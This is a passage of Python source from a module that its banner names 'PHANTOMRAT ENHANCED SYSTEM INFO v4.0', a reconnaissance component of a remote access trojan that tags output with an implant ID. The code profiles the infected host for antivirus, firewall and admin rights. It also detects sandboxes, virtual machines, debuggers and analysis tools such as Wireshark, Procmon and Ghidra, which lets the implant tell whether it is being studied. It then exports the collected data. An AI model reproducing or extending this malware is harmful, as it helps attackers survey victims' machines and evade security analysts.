                'description': f"Antivirus detected: {', '.join([av['name'] for av in av_info['detected'][:3]])}",
                'evidence': [f"Found {len(av_info['detected'])} security products"]
            })
        
        # Check Windows Defender status
        if platform.system() == 'Windows' and av_info.get('windows_defender'):
            defender = av_info['windows_defender']
            if not defender.get('realtime_enabled', True):
                findings.append({
                    'severity': 'MEDIUM',
                    'category': 'Security',
                    'description': 'Windows Defender real-time protection disabled',
                    'evidence': ['Registry indicates real-time protection is off']
                })
                risk_factors.append({
                    'severity': 'MEDIUM',
                    'factor': 'Real-time protection disabled',
                    'impact': 'Reduced malware detection capability'
                })
        
        return {
            'findings': findings,
            'risk_factors': risk_factors,
            'av_info': av_info
        }
    
    def _detect_firewall(self) -> Dict[str, Any]:
        """Detect firewall status"""
        firewall = self._get_firewall_status()
        
        findings = []
        risk_factors = []
        
        if not firewall.get('enabled', False):
            findings.append({
                'severity': 'HIGH',
                'category': 'Security',
                'description': 'Firewall is disabled',
                'evidence': ['Firewall status check returned disabled']
            })
            risk_factors.append({
                'severity': 'HIGH',
                'factor': 'Firewall disabled',
                'impact': 'Network exposure to unauthorized access'
            })
        else:
            findings.append({
                'severity': 'LOW',
                'category': 'Security',
                'description': f"Firewall enabled ({firewall.get('type', 'unknown')})",
                'evidence': [f"Firewall type: {firewall.get('type', 'unknown')}"]
            })
        
        return {
            'findings': findings,
            'risk_factors': risk_factors,
            'firewall_info': firewall
        }
    
    def _detect_sandbox(self) -> Dict[str, Any]:
        """Detect sandbox/virtualization environment"""
        is_vm = self._is_virtual_machine()
        
        findings = []
        risk_factors = []
        
        if is_vm:
            findings.append({
                'severity': 'MEDIUM',
                'category': 'Environment',
                'description': 'Running in virtual/sandbox environment',
                'evidence': ['VM indicators detected in system checks']
            })
            risk_factors.append({
                'severity': 'MEDIUM',
                'factor': 'Virtual environment',
                'impact': 'May be running in analysis sandbox'
            })
        
        return {
            'findings': findings,
            'risk_factors': risk_factors,
            'is_virtual_machine': is_vm
        }
    
    def _detect_debugger(self) -> Dict[str, Any]:
        """Detect debugger presence"""
        debugger_detected = False
        evidence = []
        
        # Check for common debuggers
        debugger_processes = [
            'ollydbg', 'x64dbg', 'x32dbg', 'ida', 'immunitydebugger',
            'windbg', 'gdb', 'lldb', 'radare2', 'ghidra'
        ]
        
        for proc in psutil.process_iter(['name']):
            try:
                proc_name = proc.info['name'].lower()
                for debugger in debugger_processes:
                    if debugger in proc_name:
                        debugger_detected = True
                        evidence.append(f"Debugger process: {proc_name}")
                        break
            except:
                continue
        
        # Check Python debugger
        if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
            debugger_detected = True
            evidence.append("Python debugger attached")
        
        findings = []
        risk_factors = []
        
        if debugger_detected:
            findings.append({
                'severity': 'CRITICAL',
                'category': 'Security',
                'description': 'Debugger detected',
                'evidence': evidence
            })
            risk_factors.append({
                'severity': 'CRITICAL',
                'factor': 'Debugger present',
                'impact': 'System may be under analysis'
            })
        
        return {
            'findings': findings,
            'risk_factors': risk_factors,
            'debugger_detected': debugger_detected
        }
    
    def _detect_monitoring_tools(self) -> Dict[str, Any]:
        """Detect monitoring/security tools"""
        monitoring_tools = []
        
        # Common monitoring/security tools
        tool_processes = [
            ('wireshark', 'Network analyzer'),
            ('procmon', 'Process monitor'),
            ('processhacker', 'Process explorer'),
            ('autoruns', 'Startup manager'),
            ('tcpview', 'TCP/UDP viewer'),
            ('sysinternals', 'Sysinternals suite'),
            ('burp', 'Web proxy'),
            ('fiddler', 'Web debugger'),
            ('charles', 'Web proxy'),
            ('zap', 'Zed Attack Proxy'),
            ('metasploit', 'Penetration testing'),
            ('cobalt', 'Cobalt Strike'),
            ('empire', 'Post-exploitation'),
            ('powersploit', 'PowerShell tools')
        ]
        
        for proc in psutil.process_iter(['name']):
            try:
                proc_name = proc.info['name'].lower()
                for tool_keyword, tool_name in tool_processes:
                    if tool_keyword in proc_name:
                        monitoring_tools.append({
                            'name': tool_name,
                            'process': proc_name,
                            'pid': proc.pid
                        })
                        break
            except:
                continue
        
        findings = []
        risk_factors = []
        
        if monitoring_tools:
            tool_names = ', '.join([t['name'] for t in monitoring_tools[:3]])
            findings.append({
                'severity': 'HIGH',
                'category': 'Security',
                'description': f"Monitoring tools detected: {tool_names}",
                'evidence': [f"Found {len(monitoring_tools)} monitoring/security tools"]
            })
            risk_factors.append({
                'severity': 'HIGH',
                'factor': 'Monitoring tools present',
                'impact': 'System may be under surveillance'
            })
        
        return {
            'findings': findings,
            'risk_factors': risk_factors,
            'monitoring_tools': monitoring_tools
        }
    
    def _detect_virtualization(self) -> Dict[str, Any]:
        """Detect virtualization/sandbox indicators"""
        # Already covered in _detect_sandbox, but with more detail
        return self._detect_sandbox()
    
    def _detect_persistence(self) -> Dict[str, Any]:
        """Detect persistence mechanisms"""
        startups = self._get_startup_programs()
        tasks = self._get_scheduled_tasks()
        
        findings = []
        risk_factors = []
        
        # Count startup items
        total_startups = 0
        for os_type, items in startups.items():
            total_startups += len(items)
        
        if total_startups > 20:  # Arbitrary threshold
            findings.append({
                'severity': 'MEDIUM',
                'category': 'Persistence',
                'description': f'High number of startup items: {total_startups}',
                'evidence': [f'Found {total_startups} startup programs across all OS types']
            })
            risk_factors.append({
                'severity': 'MEDIUM',
                'factor': 'Many startup items',
                'impact': 'Increased system boot time, potential persistence mechanisms'
            })
        
        # Check for suspicious scheduled tasks
        suspicious_tasks = []
        suspicious_keywords = ['update', 'maintenance', 'service', 'helper', 'assist']
        
        for os_type, task_list in tasks.items():
            for task in task_list:
                task_name = task.get('name', '').lower()
                if any(keyword in task_name for keyword in suspicious_keywords):
                    suspicious_tasks.append(task)
        
        if suspicious_tasks:
            findings.append({
                'severity': 'LOW',
                'category': 'Persistence',
                'description': f'Suspicious scheduled tasks found: {len(suspicious_tasks)}',
                'evidence': [f'Found {len(suspicious_tasks)} tasks with suspicious names']
            })
        
        return {
            'findings': findings,
            'risk_factors': risk_factors,
            'startup_count': total_startups,
            'suspicious_tasks': len(suspicious_tasks)
        }
    
    def _detect_network_monitoring(self) -> Dict[str, Any]:
        """Detect network monitoring"""
        connections = self._get_network_connections()
        
        findings = []
        risk_factors = []
        
        # Check for suspicious connections
        suspicious_connections = []
        suspicious_ports = [4444, 5555, 6666, 7777, 8888, 9999, 31337]  # Common backdoor ports
        
        for conn in connections:
            remote_addr = conn.get('remote_address')
            if remote_addr and remote_addr.get('port'):
                if remote_addr['port'] in suspicious_ports:
                    suspicious_connections.append(conn)
        
        if suspicious_connections:
            findings.append({
                'severity': 'HIGH',
                'category': 'Network',
                'description': f'Suspicious network connections found: {len(suspicious_connections)}',
                'evidence': [f'Connections to known suspicious ports: {[c["remote_address"]["port"] for c in suspicious_connections[:3]]}']
            })
            risk_factors.append({
                'severity': 'HIGH',
                'factor': 'Suspicious network connections',
                'impact': 'Potential backdoor or command channel'
            })
        
        return {
            'findings': findings,
            'risk_factors': risk_factors,
            'suspicious_connections': len(suspicious_connections)
        }
    
    def _is_virtual_machine(self) -> bool:
        """Check if running in virtual machine"""
        vm_indicators = []
        
        try:
            if platform.system() == 'Windows':
                # Check registry for VM indicators
                try:
                    import winreg
                    
                    # Check SystemBiosVersion
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System")
                    try:
                        bios_version, _ = winreg.QueryValueEx(key, "SystemBiosVersion")
                        vm_strings = ['virtual', 'vmware', 'vbox', 'qemu', 'xen', 'kvm', 'hyper-v']
                        if any(vm_str in str(bios_version).lower() for vm_str in vm_strings):
                            vm_indicators.append(f"BIOS Version: {bios_version}")
                    except:
                        pass
                    winreg.CloseKey(key)
                    
                    # Check disk enumeration
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Disk\Enum")
                    try:
                        device0, _ = winreg.QueryValueEx(key, "0")
                        if any(vm_str in str(device0).lower() for vm_str in vm_strings):
                            vm_indicators.append(f"Disk Enum: {device0}")
                    except:
                        pass
                    winreg.CloseKey(key)
                    
                except:
                    pass
                
                # Check WMI
                try:
                    import wmi
                    c = wmi.WMI()
                    
                    # Check BIOS
                    for bios in c.Win32_BIOS():
                        manufacturer = bios.Manufacturer.lower()
                        if any(vm_str in manufacturer for vm_str in vm_strings):
                            vm_indicators.append(f"BIOS Manufacturer: {manufacturer}")
                    
                    # Check computer system
                    for cs in c.Win32_ComputerSystem():
                        model = cs.Model.lower() if cs.Model else ''
                        if any(vm_str in model for vm_str in vm_strings):
                            vm_indicators.append(f"Computer Model: {model}")
                        
                except:
                    pass
            
            elif platform.system() == 'Linux':
                # Check /sys/class/dmi/id
                dmi_files = ['product_name', 'sys_vendor', 'bios_vendor']
                for dmi_file in dmi_files:
                    try:
                        with open(f'/sys/class/dmi/id/{dmi_file}', 'r') as f:
                            content = f.read().lower()
                            vm_strings = ['virtual', 'vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'bochs']
                            if any(vm_str in content for vm_str in vm_strings):
                                vm_indicators.append(f"{dmi_file}: {content.strip()}")
                    except:
                        pass
                
                # Check for hypervisor CPU flags
                try:
                    with open('/proc/cpuinfo', 'r') as f:
                        cpuinfo = f.read()
                        if 'hypervisor' in cpuinfo.lower():
                            vm_indicators.append("CPU flags: hypervisor flag present")
                except:
                    pass
                
                # Check for VMware/VirtualBox tools
                try:
                    # Check for VMware tools
                    if os.path.exists('/usr/bin/vmware-toolbox-cmd'):
                        vm_indicators.append("VMware tools installed")
                    
                    # Check for VirtualBox additions
                    if os.path.exists('/usr/sbin/VBoxService'):
                        vm_indicators.append("VirtualBox additions installed")
                except:
                    pass
            
            # Check for common VM processes
            vm_processes = ['vboxservice', 'vmware-tools', 'vmtoolsd', 'xen', 'qemu-ga']
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if any(vm_proc in proc_name for vm_proc in vm_processes):
                        vm_indicators.append(f"VM process: {proc_name}")
                except:
                    continue
            
            # Check MAC address for VM vendors
            try:
                for iface in psutil.net_if_addrs():
                    for addr in psutil.net_if_addrs()[iface]:
                        if addr.family == psutil.AF_LINK:
                            mac = addr.address.lower()
                            # VM vendor MAC prefixes
                            vm_mac_prefixes = ['00:05:69', '00:0c:29', '00:1c:14', '00:50:56', '08:00:27']
                            if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
                                vm_indicators.append(f"VM MAC address: {mac}")
            except:
                pass
        
        except Exception as e:
            logger.debug(f"[!] VM detection error: {e}")
        
        return len(vm_indicators) > 0
    
    def _calculate_risk_assessment(self) -> Dict[str, Any]:
        """Calculate comprehensive risk assessment"""
        logger.debug("[*] Calculating risk assessment")
        
        risk_score = 0
        risk_factors = []
        security_findings = []
        
        try:
            # Run security detectors to get findings
            for detector_name, detector_func in self.detectors.items():
                try:
                    result = detector_func()
                    if result:
                        security_findings.extend(result.get('findings', []))
                        risk_factors.extend(result.get('risk_factors', []))
                except:
                    continue
            
            # Score each risk factor
            for factor in risk_factors:
                severity = factor.get('severity', 'LOW')
                if severity == 'CRITICAL':
                    risk_score += 40
                elif severity == 'HIGH':
                    risk_score += 25
                elif severity == 'MEDIUM':
                    risk_score += 15
                elif severity == 'LOW':
                    risk_score += 5
            
            # Additional risk calculations
            
            # Check for antivirus
            av_info = self._get_antivirus_info()
            if not av_info['summary']['has_antivirus']:
                risk_score += 20
                risk_factors.append({
                    'severity': 'HIGH',
                    'factor': 'No antivirus software',
                    'impact': 'Increased malware risk'
                })
            
            # Check firewall
            firewall = self._get_firewall_status()
            if not firewall.get('enabled', False):
                risk_score += 15
                risk_factors.append({
                    'severity': 'HIGH',
                    'factor': 'Firewall disabled',
                    'impact': 'Network exposure'
                })
            
            # Check for admin/root privileges
            user_info = self._get_user_info()
            if user_info.get('is_administrator', False):
                risk_score += 25
                risk_factors.append({
                    'severity': 'HIGH',
                    'factor': 'Running with administrative privileges',
                    'impact': 'Privilege escalation not needed'
                })
            
            # Check for security tools (debuggers, monitors)
            debugger_result = self._detect_debugger()
            if debugger_result.get('debugger_detected', False):
                risk_score += 40
                risk_factors.append({
                    'severity': 'CRITICAL',
                    'factor': 'Debugger detected',
                    'impact': 'System under analysis'
                })
            
            monitoring_result = self._detect_monitoring_tools()
            if monitoring_result.get('monitoring_tools'):
                risk_score += 30
                risk_factors.append({
                    'severity': 'HIGH',
                    'factor': 'Security/monitoring tools present',
                    'impact': 'Possible security analysis environment'
                })
            
            # Check for virtualization
            if self._is_virtual_machine():
                risk_score += 10
                risk_factors.append({
                    'severity': 'MEDIUM',
                    'factor': 'Running in virtual environment',
                    'impact': 'May be sandbox/analysis environment'
                })
            
            # Check network for suspicious connections
            network_result = self._detect_network_monitoring()
            if network_result.get('suspicious_connections', 0) > 0:
                risk_score += 35
                risk_factors.append({
                    'severity': 'HIGH',
                    'factor': 'Suspicious network connections',
                    'impact': 'Potential backdoor/C2 channels'
                })
            
            # Calculate final risk level
            risk_level = RiskLevel.SAFE
            if risk_score >= 70:
                risk_level = RiskLevel.CRITICAL
            elif risk_score >= 50:
                risk_level = RiskLevel.HIGH
            elif risk_score >= 30:
                risk_level = RiskLevel.MEDIUM
            elif risk_score >= 10:
                risk_level = RiskLevel.LOW
            
            # Determine security status
            security_status = SecurityStatus.CLEAN
            if risk_level in [RiskLevel.CRITICAL, RiskLevel.HIGH]:
                security_status = SecurityStatus.COMPROMISED
            elif risk_level == RiskLevel.MEDIUM:
                security_status = SecurityStatus.SUSPICIOUS
            
            # Store security findings
            self.security_findings = security_findings
        
        except Exception as e:
            logger.error(f"[!] Risk assessment error: {e}")
            risk_level = RiskLevel.UNKNOWN
            security_status = SecurityStatus.UNKNOWN
            risk_factors.append({
                'severity': 'MEDIUM',
                'factor': 'Risk assessment error',
                'impact': f'Assessment incomplete: {str(e)[:100]}'
            })
        
        return {
            'risk_score': risk_score,
            'risk_level': risk_level.value,
            'security_status': security_status.value,
            'risk_factors': risk_factors,
            'security_findings': security_findings,
            'timestamp': datetime.datetime.now().isoformat(),
            'factors_count': len(risk_factors),
            'findings_count': len(security_findings)
        }
    
    def export_to_file(self, filename: str = None, format: str = 'json') -> Optional[str]:
        """
        Export system info to file
        
        Args:
            filename: Output filename (optional)
            format: Export format ('json', 'yaml', 'txt')
        
        Returns:
            Filename if successful, None otherwise
        """
        if filename is None:
            timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'system_info_{timestamp}.{format}'
        
        data = self.get_comprehensive_info()
        
        try:
            if format.lower() == 'json':
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2, default=str)
            
            elif format.lower() == 'yaml':
                try:
                    import yaml
                    with open(filename, 'w', encoding='utf-8') as f:
                        yaml.dump(data, f, default_flow_style=False, allow_unicode=True)
                except ImportError:
                    logger.error("[!] PyYAML not installed for YAML export")
                    return None
            
            elif format.lower() == 'txt':
                with open(filename, 'w', encoding='utf-8') as f:
                    self._export_to_text(data, f)
            
            else:
                logger.error(f"[!] Unsupported format: {format}")
                return None
            
            logger.info(f"[+] System info exported to {filename}")
            return filename
        
        except Exception as e:
            logger.error(f"[!] Error exporting to file: {e}")
            return None
    
    def _export_to_text(self, data: Dict[str, Any], file_handle):
        """Export data to human-readable text format"""
        def write_section(title, content, level=0):
            indent = '  ' * level
            file_handle.write(f"\n{indent}{'='*60}\n")
            file_handle.write(f"{indent}{title}\n")
            file_handle.write(f"{indent}{'='*60}\n")
            
            if isinstance(content, dict):
                for key, value in content.items():
                    if isinstance(value, (dict, list)):
                        write_section(key, value, level + 1)
                    else:
                        file_handle.write(f"{indent}  {key}: {value}\n")
            elif isinstance(content, list):
                for i, item in enumerate(content[:10]):  # Limit to 10 items
                    file_handle.write(f"{indent}  [{i+1}] {item}\n")
                if len(content) > 10:
                    file_handle.write(f"{indent}  ... and {len(content) - 10} more\n")
            else:
                file_handle.write(f"{indent}  {content}\n")
        
        # Write summary first
        summary = self.get_summary()
        write_section("SYSTEM SUMMARY", summary)
        
        # Write detailed sections
        for section, content in data.items():
            if section not in ['metadata', 'integrity']:  # Skip metadata and integrity hash
                write_section(section.upper(), content)
    
    def get_summary(self) -> Dict[str, Any]:
        """Get summary of system information"""
        data = self.get_comprehensive_info()
        
        summary = {
            'hostname': data['basic_info']['hostname'],
            'fqdn': data['basic_info']['fqdn'],
            'os': f"{data['basic_info']['operating_system']} {data['basic_info']['os_version']}",
            'architecture': data['basic_info']['architecture'],
            'cpu_cores': data['hardware_info']['cpu']['logical_cores'],
            'cpu_model': data['hardware_info']['cpu'].get('brand', 'Unknown'),
            'memory_gb': round(data['hardware_info']['memory']['virtual']['total'] / (1024**3), 2),
            'disk_count': len(data['hardware_info']['disks']),
            'user': data['user_info']['username'],
            'is_admin': data['user_info'].get('is_administrator', False),
            'antivirus_count': len(data['antivirus_info']['detected']),
            'process_count': data['process_info']['total_processes'],
            'network_interfaces': len(data['network_info']['connections']),
            'risk_level': data['risk_assessment']['risk_level'],
            'risk_score': data['risk_assessment']['risk_score'],
            'security_status': data['risk_assessment']['security_status'],
            'collection_time': data['metadata']['timestamp'],
            'collection_duration': data['metadata']['collection_duration'],
            'implant_id': self.implant_id
        }
        
        return summary
    
    def get_profile(self) -> SystemProfile:
        """Get system profile as dataclass"""
        summary = self.get_summary()
        
        return SystemProfile(
            hostname=summary['hostname'],
            os=summary['os'],
            architecture=summary['architecture'],
            cpu_cores=summary['cpu_cores'],
            memory_gb=summary['memory_gb'],
            username=summary['user'],
            is_admin=summary['is_admin'],
            risk_level=summary['risk_level'],
            risk_score=summary['risk_score'],
            timestamp=summary['collection_time'],
            implant_id=self.implant_id
        )
    
    def get_security_report(self) -> Dict[str, Any]:
        """Get security report"""
        risk_assessment = self._calculate_risk_assessment()
        
        report = {
            'summary': {
                'risk_score': risk_assessment['risk_score'],
                'risk_level': risk_assessment['risk_level'],
                'security_status': risk_assessment['security_status'],
                'factors_count': risk_assessment['factors_count'],
                'findings_count': risk_assessment['findings_count']
            },
            'findings': self.security_findings,
            'risk_factors': risk_assessment['risk_factors'],
            'antivirus_status': self._get_antivirus_info()['summary'],
            'firewall_status': self._get_firewall_status(),
            'user_privileges': {
                'is_admin': self._get_user_info().get('is_administrator', False),
                'username': getpass.getuser()
            },
            'environment_indicators': {
                'is_virtual_machine': self._is_virtual_machine(),
                'debugger_detected': self._detect_debugger()['debugger_detected'],
                'monitoring_tools': len(self._detect_monitoring_tools()['monitoring_tools'])
            },
            'timestamp': datetime.datetime.now().isoformat(),
            'implant_id': self.implant_id
        }
        
        return report

# ==================== GLOBAL INSTANCE AND HELPER FUNCTIONS ====================
_system_info = None

def get_system_info() -> Dict[str, Any]:
    """Get comprehensive system information (singleton)"""
    global _system_info
    if _system_info is None:
        _system_info = EnhancedSystemInfo()
    
    return _system_info.get_comprehensive_info()

def get_system_summary() -> Dict[str, Any]:
    """Get system summary"""
    sys_info = EnhancedSystemInfo()
    return sys_info.get_summary()

def get_system_profile() -> SystemProfile:
    """Get system profile"""
    sys_info = EnhancedSystemInfo()
    return sys_info.get_profile()

def get_security_report() -> Dict[str, Any]:
    """Get security report"""
    sys_info = EnhancedSystemInfo()
    return sys_info.get_security_report()

def export_system_info(filename: str = None, format: str = 'json') -> Optional[str]:
    """Export system info to file"""
    sys_info = EnhancedSystemInfo()
    return sys_info.export_to_file(filename, format)

# ==================== TEST AND DEMONSTRATION ====================
if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════╗
    ║     PHANTOMRAT ENHANCED SYSTEM INFO v4.0        ║
    ║           Testing Module                         ║
    ╚══════════════════════════════════════════════════╝
    """)
    
    print("[*] Testing Enhanced System Information Collection v4.0...")
    print("[*] This may take a few moments...")
    
    # Initialize system info collector
    sys_info = EnhancedSystemInfo()
    
    print(f"[*] Implant ID: {sys_info.implant_id}")
    print("[*] Collecting system information...")
    
    # Get summary (fast)
    summary = sys_info.get_summary()
    
    print(f"\n[+] System Summary:")
    print(f"    Hostname: {summary['hostname']}")
    print(f"    OS: {summary['os']}")
    print(f"    Architecture: {summary['architecture']}")
    print(f"    CPU Cores: {summary['cpu_cores']}")
    print(f"    Memory: {summary['memory_gb']} GB")
    print(f"    User: {summary['user']} (Admin: {summary['is_admin']})")
    print(f"    Antivirus: {summary['antivirus_count']} detected")
    print(f"    Processes: {summary['process_count']}")
    print(f"    Risk Level: {summary['risk_level']} ({summary['risk_score']} pts)")
    print(f"    Security Status: {summary['security_status']}")
    
    # Get security report
    print(f"\n[*] Generating security report...")
    security_report = sys_info.get_security_report()
    
    print(f"\n[+] Security Report:")
    print(f"    Risk Score: {security_report['summary']['risk_score']}")
    print(f"    Risk Level: {security_report['summary']['risk_level']}")
    print(f"    Security Status: {security_report['summary']['security_status']}")
    print(f"    Findings: {security_report['summary']['findings_count']}")
    print(f"    Risk Factors: {security_report['summary']['factors_count']}")
    
    if security_report['findings']:
        print(f"\n[+] Security Findings:")
        for i, finding in enumerate(security_report['findings'][:3]):  # Show first 3
            print(f"    {i+1}. [{finding['severity']}] {finding['description']}")
    
    # Export to file
    print(f"\n[*] Exporting detailed information...")
    filename = sys_info.export_to_file(format='json')
    
    if filename:
        print(f"[+] Detailed info exported to: {filename}")
    
    # Get system profile
    profile = sys_info.get_profile()
    print(f"\n[+] System Profile:")
    print(f"    ID: {profile.implant_id}")
    print(f"    Timestamp: {profile.timestamp}")
    
    print(f"\n[+] Collection complete!")
    
    # Performance information
    perf_info = sys_info._get_performance_info()
    if 'cpu' in perf_info:
        print(f"\n[+] Current Performance:")
        print(f"    CPU Usage: {perf_info['cpu']['percent_total']:.1f}%")
        print(f"    Memory Usage: {perf_info['memory']['virtual']['percent']:.1f}%")
        print(f"    Disk Usage: {list(perf_info.get('disk', {}).get('usage', {}).values())[0]['percent'] if perf_info.get('disk', {}).get('usage', {}) else 'N/A'}%")
    
    print(f"\n[*] Test completed successfully!")
